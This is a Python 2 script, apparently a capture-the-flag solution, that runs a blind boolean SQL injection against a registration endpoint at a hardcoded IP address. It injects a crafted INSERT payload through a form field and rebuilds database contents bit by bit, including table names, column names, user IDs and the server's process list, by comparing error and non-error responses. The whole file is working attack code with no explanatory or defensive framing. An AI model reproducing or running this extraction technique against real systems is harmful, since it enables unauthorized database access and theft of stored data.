from requests import post
import uuid

def sqli():
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    out = ''

    for i in xrange(1, 500):
        byte = ''
        for ii in xrange(1, 8):
            _id = str(uuid.uuid4()).replace('-', '')
            _id2 = str(uuid.uuid4()).replace('-', '')

            '''
            ascii(substr(lpad( bin( ord(substr(user(), 1, 1)) ), 0, 7  ),1,1))>0

            limit, where, group
            user = db_manager@localhost
            db = userdata

            INSERT INTO users values('q!w's)4 p(7%4?b3#"2#r` fu00#sbqt','92429d82a41e930486c6de5ebda9602d55c39986','asdfasdf'), (0x71647322333

            having w=?

            anggimottijuno // asdfasdf
            '''

            query = 'ascii(substr(lpad( bin( ord(substr(0x41, %d, 1)) ), 0, 7  ),%d,1))!=0' % (i, ii)
            xx = '(select group_concat(table_name) from information_schema.tables where table_schema=database())'
            xx = 'select table_name from information_schema.tables'
            
            xx = 'select info from information_schema.processlist having info like 0x{}'.format('%junoimisgod%'.encode('hex'))
            xx = 'select info from information_schema.processlist having info like 0x{}'.format('%sqli_is_god_fuck%'.encode('hex'))

            # xx = 'select id from user having id like 0x{}'.format('juno'.encode('hex'))

            # xx = 'select table_name from information_schema.tables having table_name like 0x{} and table_schema like 0x{}'.format('%users%'.encode('hex'), 'userdata'.encode('hex'))

            # xx = 'select name from users having name like 0x{}'.format('%anggimottijuno%'.encode('hex'))

            xx = 'select column_name from (select *,@ROWNUM6 := @ROWNUM6 +1 as ROWNUM from information_schema.columns, (select @ROWNUM6 := 0) R having table_name=0x7573657273 and ROWNUM=3)x'



            xx = 'select id from (select *,@ROWNUM6 := @ROWNUM6 +1 as ROWNUM from users, (select @ROWNUM6 := 0) R having ac like ROWNUM=1)x'
            # xx = 'select id from (select * from users having id=0x61646d316e6b796a)x'

            ## 6b7dfbea718383b12b4a0ac4aecd8c7aff78fe21
            query = ' substr(lpad(bin(ascii(substr( (%s) , %d, 1))),7,0),%d,1)>0x30 '  % (xx, 2, ii)
            # print query
            data = {
                'id': _id2,
                'pw': 'asdfasdf',
                'ac': "asdfasdf'), (0x{_id}, 0x{pw}, if(({query}), (select 1 union select 2), 0x41))-- 1".format(_id=_id.encode('hex'), pw='6A204BD89F3C8348AFD5C77C717A097A'.encode('hex'),
                    query=query, fuck='a'*0)
            }
            
            c = post('http://110.10.147.112/?p=reg', headers=headers, data=data)
            if 'error' in c.text:
                byte = byte + '0'
            elif 'hack' in c.text:
                print 'wtf?'
                exit(0)
            else:
                byte = byte + '1'

        out += chr(int(byte, 2))
        print out
    



sqli()